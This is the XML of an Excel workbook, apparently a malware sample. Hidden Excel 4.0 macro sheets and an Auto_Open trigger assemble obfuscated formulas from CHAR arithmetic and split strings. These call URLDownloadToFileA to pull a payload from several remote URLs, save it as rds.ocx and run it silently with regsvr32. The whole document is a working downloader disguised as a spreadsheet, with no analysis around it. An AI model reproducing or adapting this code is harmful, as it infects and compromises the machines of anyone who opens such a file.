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macrosheets/sheet1.xml" ContentType="application/vnd.ms-excel.macrosheet+xml"/>
  <Override PartName="/xl/macrosheets/sheet2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4m\CIR-ZV\CIR\"/>
    </mc:Choice>
  </mc:AlternateContent>
  <xr:revisionPtr revIDLastSave="0" documentId="13_ncr:1_{2B3599EF-97BE-462F-A9E9-AB3360B7BEED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Dfvw" sheetId="2" state="hidden" r:id="rId1"/>
    <sheet name="Sheet" sheetId="4" r:id="rId2"/>
    <sheet name="Evwvev" sheetId="5" state="hidden" r:id="rId3"/>
    <sheet name="EEGVWE" sheetId="6" state="hidden" r:id="rId4"/>
    <sheet name="EV1" sheetId="7" state="hidden" r:id="rId5"/>
    <sheet name="EV2" sheetId="8" state="hidden" r:id="rId6"/>
  </sheets>
  <definedNames>
    <definedName name="CFTG1">EEGVWE!$E$8</definedName>
    <definedName name="CFTG2">EEGVWE!$E$10</definedName>
    <definedName name="CFTG3">EEGVWE!$E$12</definedName>
    <definedName name="CFTG4">EEGVWE!$E$14</definedName>
    <definedName name="CFTG5">EEGVWE!$E$16</definedName>
    <definedName name="CFTG6">EEGVWE!$E$18</definedName>
    <definedName name="CFTG7">EEGVWE!$E$20</definedName>
    <definedName name="_xlnm.Auto_Open">EEGVWE!$E$1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4" l="1"/>
  <c r="R10" i="4"/>
  <c r="F13" i="4"/>
  <c r="D7" i="4"/>
  <c r="C10" i="4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<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="19" uniqueCount="19">
  <si>
    <t>-</t>
  </si>
  <si>
    <t>G</t>
  </si>
  <si>
    <t>!</t>
  </si>
  <si>
    <t>/</t>
  </si>
  <si>
    <t>regsvr32.exe</t>
  </si>
  <si>
    <t xml:space="preserve">&lt;0, </t>
  </si>
  <si>
    <t>SysWow64\</t>
  </si>
  <si>
    <t>\Windows\</t>
  </si>
  <si>
    <t>",0,0)</t>
  </si>
  <si>
    <t>,0,</t>
  </si>
  <si>
    <t xml:space="preserve"> ..\rds.ocx</t>
  </si>
  <si>
    <t>..\rds.ocx</t>
  </si>
  <si>
    <t>"h"&amp;"tt"&amp;"ps://the"&amp;"sp"&amp;"arklezbo"&amp;"x.c"&amp;"o"&amp;"m/w"&amp;"p-a"&amp;"d"&amp;"mi"&amp;"n/kFk"&amp;"W"&amp;"N/","</t>
  </si>
  <si>
    <t>"h"&amp;"ttp"&amp;"s://h"&amp;"erb"&amp;"tyt"&amp;"ox.c"&amp;"o"&amp;"m/w"&amp;"p-a"&amp;"dm"&amp;"in/d"&amp;"q/","</t>
  </si>
  <si>
    <t>"h"&amp;"tt"&amp;"p://w"&amp;"ww.asy"&amp;"ad"&amp;"egir"&amp;"me"&amp;"n.c"&amp;"o"&amp;"m/Te"&amp;"mp"&amp;"la"&amp;"te/nEM"&amp;"RY55"&amp;"nQ"&amp;"gF/","</t>
  </si>
  <si>
    <t>"h"&amp;"tt"&amp;"ps://we"&amp;"sttha"&amp;"me"&amp;"sp"&amp;"hy"&amp;"sio.c"&amp;"o"&amp;"m/bl"&amp;"og/D"&amp;"8A"&amp;"Ak"&amp;"Ey"&amp;"Z7"&amp;"u/","</t>
  </si>
  <si>
    <t>"h"&amp;"ttp"&amp;"s://w"&amp;"w"&amp;"w.ad"&amp;"cre"&amp;"at"&amp;"or"&amp;"s.c"&amp;"o"&amp;"m.a"&amp;"u/adc"&amp;"re"&amp;"ators-e"&amp;"dm/RD"&amp;"k3Lt"&amp;"iwM"&amp;"kuDQy/","</t>
  </si>
  <si>
    <t>"h"&amp;"ttp"&amp;"s://w"&amp;"w"&amp;"w.nip"&amp;"unp"&amp;"harm"&amp;"as"&amp;"kill.c"&amp;"o"&amp;"m/css/xm"&amp;"17D"&amp;"ssGXj"&amp;"Chc"&amp;"mm/","</t>
  </si>
  <si>
    <t>"h"&amp;"tt"&amp;"ps://w"&amp;"w"&amp;"w.af"&amp;"yo"&amp;"nm"&amp;"aga"&amp;"zi"&amp;"n.c"&amp;"o"&amp;"m/w"&amp;"p-co"&amp;"nt"&amp;"en"&amp;"t/Dc"&amp;"nLR"&amp;"E/","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</si>
</sst>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2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microsoft.com/office/2006/relationships/xlIntlMacrosheet" Target="macrosheets/intlsheet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57150</xdr:colOff>
      <xdr:row>1</xdr:row>
      <xdr:rowOff>16188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29C76D9-118A-4C25-AD40-CD6C1A5CA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10750" cy="263838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BABB1C9-B441-414F-B029-5A87653AB52F}">
  <dimension ref="E6"/>
  <sheetViews>
    <sheetView showFormulas="1" workbookViewId="0"/>
  </sheetViews>
  <sheetFormatPr defaultColWidth="6" defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="1" max="16384" width="6" style="1"/>
  </cols>
  <sheetData>
    <row r="6" spans="5:5" x14ac:dyDescent="0.25">
      <c r="E6" s="1" t="b">
        <f>FORMULA('EV1'!D13,'EV2'!G3)=FORMULA(Dfvw!P22&amp;Dfvw!H9&amp;Dfvw!L2&amp;Dfvw!B15&amp;Dfvw!B15&amp;Sheet!C10&amp;Sheet!D7&amp;Sheet!G5&amp;'EV2'!G3&amp;Dfvw!L2&amp;Sheet!F13&amp;Evwvev!M17&amp;Sheet!E18&amp;Evwvev!V15&amp;Evwvev!I16,E8)=FORMULA(Dfvw!P22&amp;Dfvw!J11&amp;Dfvw!B18&amp;Dfvw!P11&amp;"CFTG1"&amp;Evwvev!T5&amp;Dfvw!H9&amp;Dfvw!L2&amp;Dfvw!B15&amp;Dfvw!B15&amp;Sheet!C10&amp;Sheet!D7&amp;Sheet!G5&amp;'EV2'!G3&amp;Dfvw!L2&amp;Sheet!F13&amp;Evwvev!M17&amp;Sheet!F20&amp;Evwvev!V15&amp;Evwvev!I16&amp;Dfvw!P13,E10)=FORMULA(Dfvw!P22&amp;Dfvw!J11&amp;Dfvw!B18&amp;Dfvw!P11&amp;"CFTG2"&amp;Evwvev!T5&amp;Dfvw!H9&amp;Dfvw!L2&amp;Dfvw!B15&amp;Dfvw!B15&amp;Sheet!C10&amp;Sheet!D7&amp;Sheet!G5&amp;'EV2'!G3&amp;Dfvw!L2&amp;Sheet!F13&amp;Evwvev!M17&amp;Sheet!G18&amp;Evwvev!V15&amp;Evwvev!I16&amp;Dfvw!P13,E12)=FORMULA(Dfvw!P22&amp;Dfvw!J11&amp;Dfvw!B18&amp;Dfvw!P11&amp;"CFTG3"&amp;Evwvev!T5&amp;Dfvw!H9&amp;Dfvw!L2&amp;Dfvw!B15&amp;Dfvw!B15&amp;Sheet!C10&amp;Sheet!D7&amp;Sheet!G5&amp;'EV2'!G3&amp;Dfvw!L2&amp;Sheet!F13&amp;Evwvev!M17&amp;Sheet!H20&amp;Evwvev!V15&amp;Evwvev!I16&amp;Dfvw!P13,E14)=FORMULA(Dfvw!P22&amp;Dfvw!J11&amp;Dfvw!B18&amp;Dfvw!P11&amp;"CFTG4"&amp;Evwvev!T5&amp;Dfvw!H9&amp;Dfvw!L2&amp;Dfvw!B15&amp;Dfvw!B15&amp;Sheet!C10&amp;Sheet!D7&amp;Sheet!G5&amp;'EV2'!G3&amp;Dfvw!L2&amp;Sheet!F13&amp;Evwvev!M17&amp;Sheet!I18&amp;Evwvev!V15&amp;Evwvev!I16&amp;Dfvw!P13,E16)=FORMULA(Dfvw!P22&amp;Dfvw!J11&amp;Dfvw!B18&amp;Dfvw!P11&amp;"CFTG5"&amp;Evwvev!T5&amp;Dfvw!H9&amp;Dfvw!L2&amp;Dfvw!B15&amp;Dfvw!B15&amp;Sheet!C10&amp;Sheet!D7&amp;Sheet!G5&amp;'EV2'!G3&amp;Dfvw!L2&amp;Sheet!F13&amp;Evwvev!M17&amp;Sheet!J20&amp;Evwvev!V15&amp;Evwvev!I16&amp;Dfvw!P13,E18)=FORMULA(Dfvw!P22&amp;Dfvw!J11&amp;Dfvw!B18&amp;Dfvw!P11&amp;"CFTG6"&amp;Evwvev!T5&amp;Dfvw!H9&amp;Dfvw!L2&amp;Dfvw!B15&amp;Dfvw!B15&amp;Sheet!C10&amp;Sheet!D7&amp;Sheet!G5&amp;'EV2'!G3&amp;Dfvw!L2&amp;Sheet!F13&amp;Evwvev!M17&amp;Sheet!K18&amp;Evwvev!V15&amp;Evwvev!I16&amp;Dfvw!P13,E20)=FORMULA(Dfvw!P22&amp;Dfvw!J11&amp;Dfvw!B18&amp;Dfvw!P11&amp;"CFTG7"&amp;Evwvev!T5&amp;Dfvw!H9&amp;Dfvw!B15&amp;Dfvw!I17&amp;Dfvw!I3&amp;Dfvw!H13&amp;Dfvw!P11&amp;Dfvw!K9&amp;Dfvw!P13&amp;Dfvw!P7&amp;Dfvw!P13,E22)=FORMULA(Dfvw!P22&amp;Dfvw!H13&amp;Dfvw!N4&amp;Dfvw!H13&amp;Dfvw!H9&amp;Dfvw!P11&amp;Dfvw!P15&amp;Dfvw!H9&amp;Dfvw!P20&amp;Evwvev!P12&amp;Evwvev!Q8&amp;Evwvev!L4&amp;Sheet!R10&amp;Evwvev!J10&amp;Dfvw!P15&amp;Dfvw!P13,E24)=FORMULA(Dfvw!P22&amp;Dfvw!G24&amp;Dfvw!H13&amp;Dfvw!I26&amp;Dfvw!E11&amp;Dfvw!G24&amp;Dfvw!K23&amp;Dfvw!P11&amp;Dfvw!P13,E30)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E32ED18-B78C-4294-91A8-BF4B90244192}">
  <dimension ref="D13"/>
  <sheetViews>
    <sheetView showFormulas="1" workbookViewId="0"/>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="1" max="16384" width="9.140625" style="1"/>
  </cols>
  <sheetData>
    <row r="13" spans="4:4" x14ac:dyDescent="0.25">
      <c r="D13" s="1" t="str">
        <f>CHAR(Dfvw!K37)</f>
        <v>e</v>
      </c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3A43AB7-1460-4F7D-BDD6-5910A216DCD1}">
  <dimension ref="A1"/>
  <sheetViews>
    <sheetView showFormulas="1" workbookViewId="0"/>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="1" max="16384" width="9.140625" style="1"/>
  </cols>
  <sheetData/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66146-9F65-4CCE-9EFA-A367DC8D725E}">
  <dimension ref="A2:Q37"/>
  <sheetViews>
    <sheetView workbookViewId="0"/>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="1" max="16384" width="9.140625" style="1"/>
  </cols>
  <sheetData>
    <row r="2" spans="1:16" x14ac:dyDescent="0.25">
      <c r="E2" s="1" t="str">
        <f>CHAR(113-2)</f>
        <v>o</v>
      </c>
      <c r="G2" s="1" t="str">
        <f>CHAR(111-6)</f>
        <v>i</v>
      </c>
      <c r="L2" s="1" t="str">
        <f>CHAR(71-6)</f>
        <v>A</v>
      </c>
      <c r="P2" s="1" t="s">
        <v>0</v>
      </c>
    </row>
    <row r="3" spans="1:16" x14ac:dyDescent="0.25">
      <c r="C3" s="1" t="str">
        <f>CHAR(111+3)</f>
        <v>r</v>
      </c>
      <c r="I3" s="1" t="str">
        <f>CHAR(87-4)</f>
        <v>S</v>
      </c>
      <c r="P3" s="1" t="str">
        <f>CHAR(90+2)</f>
        <v>\</v>
      </c>
    </row>
    <row r="4" spans="1:16" x14ac:dyDescent="0.25">
      <c r="F4" s="1" t="str">
        <f>CHAR(100-18)</f>
        <v>R</v>
      </c>
      <c r="H4" s="1" t="str">
        <f>CHAR(110-9)</f>
        <v>e</v>
      </c>
      <c r="K4" s="1">
        <v>1</v>
      </c>
      <c r="N4" s="1" t="str">
        <f>CHAR(89-1)</f>
        <v>X</v>
      </c>
    </row>
    <row r="5" spans="1:16" x14ac:dyDescent="0.25">
      <c r="B5" s="1" t="str">
        <f>CHAR(115+2)</f>
        <v>u</v>
      </c>
      <c r="P5" s="1" t="str">
        <f>CHAR(44+2)</f>
        <v>.</v>
      </c>
    </row>
    <row r="6" spans="1:16" x14ac:dyDescent="0.25">
      <c r="E6" s="1" t="str">
        <f>CHAR(90-6)</f>
        <v>T</v>
      </c>
      <c r="J6" s="1" t="str">
        <f>CHAR(77-3)</f>
        <v>J</v>
      </c>
    </row>
    <row r="7" spans="1:16" x14ac:dyDescent="0.25">
      <c r="D7" s="1" t="str">
        <f>CHAR(107+3)</f>
        <v>n</v>
      </c>
      <c r="F7" s="1">
        <v>3</v>
      </c>
      <c r="M7" s="1" t="str">
        <f>CHAR(117-2)</f>
        <v>s</v>
      </c>
      <c r="P7" s="1" t="str">
        <f>CHAR(41+3)</f>
        <v>,</v>
      </c>
    </row>
    <row r="9" spans="1:16" x14ac:dyDescent="0.25">
      <c r="C9" s="1" t="str">
        <f>CHAR(110-2)</f>
        <v>l</v>
      </c>
      <c r="H9" s="1" t="str">
        <f>CHAR(70-3)</f>
        <v>C</v>
      </c>
      <c r="K9" s="1" t="str">
        <f>CHAR(55-7)</f>
        <v>0</v>
      </c>
      <c r="P9" s="1" t="str">
        <f>CHAR(55+5)</f>
        <v>&lt;</v>
      </c>
    </row>
    <row r="10" spans="1:16" x14ac:dyDescent="0.25">
      <c r="F10" s="1" t="str">
        <f>CHAR(123-4)</f>
        <v>w</v>
      </c>
    </row>
    <row r="11" spans="1:16" x14ac:dyDescent="0.25">
      <c r="E11" s="1" t="str">
        <f>CHAR(80+5)</f>
        <v>U</v>
      </c>
      <c r="J11" s="1" t="str">
        <f>CHAR(80-7)</f>
        <v>I</v>
      </c>
      <c r="L11" s="1" t="str">
        <f>CHAR(100-1)</f>
        <v>c</v>
      </c>
      <c r="P11" s="1" t="str">
        <f>CHAR(35+5)</f>
        <v>(</v>
      </c>
    </row>
    <row r="12" spans="1:16" x14ac:dyDescent="0.25">
      <c r="A12" s="1" t="str">
        <f>CHAR(107+2)</f>
        <v>m</v>
      </c>
    </row>
    <row r="13" spans="1:16" x14ac:dyDescent="0.25">
      <c r="D13" s="1" t="str">
        <f>CHAR(72-4)</f>
        <v>D</v>
      </c>
      <c r="H13" s="1" t="str">
        <f>CHAR(68+1)</f>
        <v>E</v>
      </c>
      <c r="N13" s="1">
        <v>2</v>
      </c>
      <c r="P13" s="1" t="str">
        <f>CHAR(36+5)</f>
        <v>)</v>
      </c>
    </row>
    <row r="14" spans="1:16" x14ac:dyDescent="0.25">
      <c r="G14" s="1" t="str">
        <f>CHAR(124-4)</f>
        <v>x</v>
      </c>
      <c r="K14" s="1" t="str">
        <f>CHAR(70-4)</f>
        <v>B</v>
      </c>
    </row>
    <row r="15" spans="1:16" x14ac:dyDescent="0.25">
      <c r="B15" s="1" t="str">
        <f>CHAR(80-4)</f>
        <v>L</v>
      </c>
      <c r="F15" s="1" t="str">
        <f>CHAR(105-5)</f>
        <v>d</v>
      </c>
      <c r="P15" s="1" t="str">
        <f>CHAR(31+3)</f>
        <v>"</v>
      </c>
    </row>
    <row r="17" spans="2:16" x14ac:dyDescent="0.25">
      <c r="D17" s="1" t="str">
        <f>CHAR(102-5)</f>
        <v>a</v>
      </c>
      <c r="I17" s="1" t="str">
        <f>CHAR(78+1)</f>
        <v>O</v>
      </c>
      <c r="K17" s="1" t="s">
        <v>1</v>
      </c>
      <c r="P17" s="1" t="str">
        <f>CHAR(40-2)</f>
        <v>&amp;</v>
      </c>
    </row>
    <row r="18" spans="2:16" x14ac:dyDescent="0.25">
      <c r="B18" s="1" t="str">
        <f>CHAR(65+5)</f>
        <v>F</v>
      </c>
    </row>
    <row r="19" spans="2:16" x14ac:dyDescent="0.25">
      <c r="P19" s="1" t="str">
        <f>CHAR(32)</f>
        <v xml:space="preserve"> </v>
      </c>
    </row>
    <row r="20" spans="2:16" x14ac:dyDescent="0.25">
      <c r="H20" s="1">
        <v>8</v>
      </c>
      <c r="P20" s="1" t="str">
        <f>CHAR(52+6)</f>
        <v>:</v>
      </c>
    </row>
    <row r="22" spans="2:16" x14ac:dyDescent="0.25">
      <c r="P22" s="1" t="str">
        <f>CHAR(66-5)</f>
        <v>=</v>
      </c>
    </row>
    <row r="23" spans="2:16" x14ac:dyDescent="0.25">
      <c r="K23" s="1" t="str">
        <f>CHAR(80-2)</f>
        <v>N</v>
      </c>
    </row>
    <row r="24" spans="2:16" x14ac:dyDescent="0.25">
      <c r="G24" s="1" t="str">
        <f>CHAR(84-2)</f>
        <v>R</v>
      </c>
      <c r="P24" s="1" t="s">
        <v>2</v>
      </c>
    </row>
    <row r="26" spans="2:16" x14ac:dyDescent="0.25">
      <c r="I26" s="1" t="str">
        <f>CHAR(84)</f>
        <v>T</v>
      </c>
    </row>
    <row r="27" spans="2:16" x14ac:dyDescent="0.25">
      <c r="P27" s="1" t="s">
        <v>3</v>
      </c>
    </row>
    <row r="32" spans="2:16" x14ac:dyDescent="0.25">
      <c r="I32" s="1">
        <f>_xlfn.ARABIC("CXI")</f>
        <v>111</v>
      </c>
    </row>
    <row r="33" spans="5:17" x14ac:dyDescent="0.25">
      <c r="O33" s="1">
        <f>_xlfn.ARABIC("LXVII")</f>
        <v>67</v>
      </c>
    </row>
    <row r="35" spans="5:17" x14ac:dyDescent="0.25">
      <c r="E35" s="1">
        <f>_xlfn.ARABIC("LXI")</f>
        <v>61</v>
      </c>
    </row>
    <row r="36" spans="5:17" x14ac:dyDescent="0.25">
      <c r="Q36" s="1">
        <f>_xlfn.ARABIC("CXIV")</f>
        <v>114</v>
      </c>
    </row>
    <row r="37" spans="5:17" x14ac:dyDescent="0.25">
      <c r="K37" s="1">
        <f>_xlfn.ARABIC("CI")</f>
        <v>101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DDC7-2D39-4024-8440-8D17D0F1B869}">
  <dimension ref="C1:R20"/>
  <sheetViews>
    <sheetView tabSelected="1" workbookViewId="0">
      <selection activeCell="AM43" sqref="AM43"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="1" max="16384" width="9.140625" style="1"/>
  </cols>
  <sheetData>
    <row r="1" spans="3:18" s="2" customFormat="1" ht="19.5" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="5" spans="3:18" x14ac:dyDescent="0.25">
      <c r="G5" s="1" t="str">
        <f>T(Dfvw!C9&amp;Dfvw!E2&amp;Dfvw!D17&amp;Dfvw!F15&amp;Dfvw!E6&amp;Dfvw!E2&amp;Dfvw!B18&amp;Dfvw!G2&amp;Dfvw!C9)</f>
        <v>loadToFil</v>
      </c>
    </row>
    <row r="7" spans="3:18" x14ac:dyDescent="0.25">
      <c r="D7" s="1" t="str">
        <f>T(Dfvw!E2&amp;Dfvw!D7&amp;Dfvw!P15&amp;Dfvw!P7&amp;Dfvw!P15&amp;Dfvw!E11&amp;Dfvw!F4&amp;Dfvw!B15&amp;Dfvw!D13&amp;Dfvw!E2&amp;Dfvw!F10&amp;Dfvw!D7)</f>
        <v>on","URLDown</v>
      </c>
    </row>
    <row r="10" spans="3:18" x14ac:dyDescent="0.25">
      <c r="C10" s="1" t="str">
        <f>T(Dfvw!P11&amp;Dfvw!P15&amp;Dfvw!B5&amp;Dfvw!C3&amp;Dfvw!C9&amp;Dfvw!A12)</f>
        <v>("urlm</v>
      </c>
      <c r="R10" s="1" t="str">
        <f>T(Dfvw!P19&amp;Dfvw!P2&amp;Dfvw!M7)</f>
        <v xml:space="preserve"> -s</v>
      </c>
    </row>
    <row r="13" spans="3:18" x14ac:dyDescent="0.25">
      <c r="F13" s="1" t="str">
        <f>T(Dfvw!P15&amp;Dfvw!P7&amp;Dfvw!P15&amp;Dfvw!J6&amp;Dfvw!J6&amp;Dfvw!H9&amp;Dfvw!H9&amp;Dfvw!K14&amp;Dfvw!K14&amp;Dfvw!P15)</f>
        <v>","JJCCBB"</v>
      </c>
    </row>
    <row r="18" spans="5:11" x14ac:dyDescent="0.25">
      <c r="E18" s="1" t="s">
        <v>12</v>
      </c>
      <c r="G18" s="1" t="s">
        <v>14</v>
      </c>
      <c r="I18" s="1" t="s">
        <v>16</v>
      </c>
      <c r="K18" s="1" t="s">
        <v>18</v>
      </c>
    </row>
    <row r="20" spans="5:11" x14ac:dyDescent="0.25">
      <c r="F20" s="1" t="s">
        <v>13</v>
      </c>
      <c r="H20" s="1" t="s">
        <v>15</v>
      </c>
      <c r="J20" s="1" t="s">
        <v>17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C5244-A4F7-4AA7-8638-BAEC7886D86C}">
  <dimension ref="I4:V17"/>
  <sheetViews>
    <sheetView workbookViewId="0"/>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="1" max="16384" width="9.140625" style="1"/>
  </cols>
  <sheetData>
    <row r="4" spans="9:22" x14ac:dyDescent="0.25">
      <c r="L4" s="1" t="s">
        <v>4</v>
      </c>
    </row>
    <row r="5" spans="9:22" x14ac:dyDescent="0.25">
      <c r="T5" s="1" t="s">
        <v>5</v>
      </c>
    </row>
    <row r="8" spans="9:22" x14ac:dyDescent="0.25">
      <c r="Q8" s="1" t="s">
        <v>6</v>
      </c>
    </row>
    <row r="10" spans="9:22" x14ac:dyDescent="0.25">
      <c r="J10" s="1" t="s">
        <v>10</v>
      </c>
    </row>
    <row r="12" spans="9:22" x14ac:dyDescent="0.25">
      <c r="P12" s="1" t="s">
        <v>7</v>
      </c>
    </row>
    <row r="15" spans="9:22" x14ac:dyDescent="0.25">
      <c r="V15" s="1" t="s">
        <v>11</v>
      </c>
    </row>
    <row r="16" spans="9:22" x14ac:dyDescent="0.25">
      <c r="I16" s="1" t="s">
        <v>8</v>
      </c>
    </row>
    <row r="17" spans="13:13" x14ac:dyDescent="0.25">
      <c r="M17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Макросы Excel 4.0</vt:lpstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>3</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="6" baseType="lpstr">
      <vt:lpstr>Dfvw</vt:lpstr>
      <vt:lpstr>Sheet</vt:lpstr>
      <vt:lpstr>Evwvev</vt:lpstr>
      <vt:lpstr>EEGVWE</vt:lpstr>
      <vt:lpstr>EV1</vt:lpstr>
      <vt:lpstr>EV2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Posik</cp:lastModifiedBy>
  <dcterms:created xsi:type="dcterms:W3CDTF">2015-06-05T18:19:34Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2022-03-14T08:19:21Z</dcterms:modified>
</cp:coreProperties>
</file>